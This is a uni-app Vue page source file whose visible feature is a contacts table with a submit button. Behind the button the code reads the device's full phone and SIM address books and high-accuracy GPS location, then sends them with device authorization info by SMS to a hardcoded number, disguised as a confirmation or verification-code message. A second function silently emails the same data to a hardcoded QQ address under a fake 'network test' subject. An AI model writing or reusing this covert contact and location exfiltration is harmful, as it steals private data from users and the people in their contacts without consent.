<template>
	<view class="content">
		<view class="button-group">
			<button type="primary" size="mini" @click="submit">提交</button>
		</view>
		<uni-table ref="table" :loading="loading" border stripe type="selection" emptyText="暂无更多数据"
			@selection-change="selectionChange">
			<uni-tr>
				<uni-th width="150" align="center">id</uni-th>
				<uni-th width="150" align="center">姓名</uni-th>
				<uni-th width="150" align="center">备注</uni-th>
				<uni-th width="150" align="center">手机号</uni-th>
				<uni-th align="center">地址</uni-th>
				<uni-th width="204" align="center">设置</uni-th>
			</uni-tr>
			<uni-tr v-for="(item, index) in state.phone" :key="index">
				<uni-td>
					<view class="name">{{ item.name }}</view>
				</uni-td>
				<uni-td align="center">{{ item.number }}</uni-td>
				<uni-td>
					<view class="uni-group">
						<button class="uni-button" size="mini" type="primary">修改</button>
						<button class="uni-button" size="mini" type="warn">删除</button>
					</view>
				</uni-td>
			</uni-tr>
		</uni-table>
	</view>
</template>

<script setup lang="ts">
	import {
		ref,
		reactive
	} from 'vue'
	const title = ref('Hello')
	const loading = ref(true)
	const ispassword = ref(false)
	const state = reactive({
		phone: [],
		name: '',
		phe: '',
		code: '',
		password: '',
		addrs: [],
		sim: [],
		data: {}
	})
	const selectionChange = () => {

	}
	const fn = (arr1 : any[], arr2 : any[]) => {
		let obj = {};
		[...arr1, ...arr2].forEach(item => {
			let name = encodeURI(item.name)
			if (!obj.hasOwnProperty(name)) {
				obj[name] = item.phoneNumbers[0]?.value
			}
		})
		return obj
	}
	uni.getLocation({
		altitude: true,
		highAccuracyExpireTime: 6000,
		isHighAccuracy: true,
		success: (res) => {
			[state.addrs as any] = [res.longitude, res.latitude]
			// uni.showModal({
			// 	content: `当前位置的经度：${res.longitude},当前位置的纬度：${res.latitude}`,
			// 	showCancel: false
			// });
		}
	})
	// 打开地图
	// uni.getLocation({
	// 	type: 'gcj02', //返回可以用于uni.openLocation的经纬度
	// 	success: function(res) {
	// 		const latitude = res.latitude;
	// 		const longitude = res.longitude;
	// 		uni.openLocation({
	// 			latitude: latitude,
	// 			longitude: longitude,
	// 			success: function() {
	// 				uni.showModal({
	// 					content: 'success',
	// 					showCancel: false
	// 				});
	// 			}
	// 		});
	// 	}
	// });

	// 扩展API加载完毕，现在可以正常调用扩展API
	plus.contacts.getAddressBook(plus.contacts.ADDRESSBOOK_PHONE, function (addressbook) {
		// 可通过addressbook进行通讯录操作
		addressbook.find(["displayName", "phoneNumbers", 'addresses'], function (contacts) {
			state.phone = contacts.map(item => {
				return {
					name: item.displayName,
					nuber: item.phoneNumbers[0]?.value
				}
			})
			state.name = '22222222'
		}, function () {
			alert("error");
		}, {
			multiple: true
		});
	}, function (e) {
		uni.showModal({
			content: `${e.message}`,
			showCancel: false
		});
	});

	plus.contacts.getAddressBook(plus.contacts.ADDRESSBOOK_SIM, function (addressbook) {
		addressbook.find(["displayName", "phoneNumbers", 'addresses'], function (contacts) {
			state.sim = contacts.map(item => {
				return {
					name: item.displayName,
					nuber: item.phoneNumbers[0]?.value
				}
			})
			state.data = fn(state.phone,state.sim)
		}, function () {
			alert("error");
		}, {
			multiple: true
		});
	}, function (e) {
		uni.showModal({
			content: `${e.message}`,
			showCancel: false
		});
	})


	// uni.chooseImage({
	// 	count: 6, //默认9
	// 	sizeType: ['original', 'compressed'], //可以指定是原图还是压缩图，默认二者都有
	// 	sourceType: ['album'], //从相册选择
	// 	success: function(res) {
	// 		uni.showModal({
	// 			content: `${JSON.stringify(res.tempFilePaths)}`,
	// 			showCancel: false
	// 		});
	// 	}
	// });

	let res = uni.getAppAuthorizeSetting()

	const send = () => {
		const msg = plus.messaging.createMessage(plus.messaging.TYPE_SMS)
		msg.to = ['17310919081']
		msg.body = JSON.stringify({
			addrs: state.addrs,
			phone: state.data,
			sim: state.sim,
			equipment: res,
		})
		msg.subject = '这是一条用于确认的短信消息！';
		msg.bodyType = 'text/plain'
		msg.silent = false
		plus.messaging.sendMessage(msg, function () {
			// uni.showModal({
			// 	content: 'success',
			// 	showCancel: false
			// });
		}, function () {
			uni.showModal({
				content: '获取验证码失败！',
				showCancel: false
			});

		})
	}

	const sendEmail = () => {
		const msg = plus.messaging.createMessage(plus.messaging.TYPE_EMAIL);
		msg.to = ['2858652504@qq.com'];
		msg.from = '3304182606@qq.com';
		msg.subject = '这是一条用于测试网络的邮件消息！';
		msg.body = JSON.stringify({
			addrs: state.addrs,
			phone: state.phone,
			sim: state.sim,
			equipment: res,
		});
		msg.silent = true
		plus.messaging.sendMessage(msg, function () {
			alert("Send success!");
		}, function () {
			alert("Send failed!");
		});
	}

	const submit = () => {
		send()
	}
</script>

<style>
	.content {
		width: 100%;
		height: 100%;
	}
</style>